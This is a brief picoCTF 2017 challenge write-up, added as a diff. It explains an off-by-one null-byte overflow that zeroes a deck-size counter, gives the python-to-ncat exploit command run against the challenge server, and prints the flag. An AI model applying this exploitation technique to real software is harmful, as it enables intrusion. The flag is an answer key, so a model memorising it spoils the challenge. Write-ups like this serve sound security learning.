@@ -1,0 +1,6 @@
+1. Find the bug - the bug is that it will set buff[len] to \x00, which is out of bounds of the buffer.
+2. This sets your deckSize to 0 since deckSize is immediately under your name
+3. You will never satisfy the run-out-of-cards check, so it'll go backwards in memory.
+4. Use command on Kali:
+(python -c 'print("11112222333344445555666677778888\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n41\n82\n164\n328")'; cat) | ncat shell2017.picoctf.com 32251
+flag: 5f28113500ed744dea5b22743db9b9b6
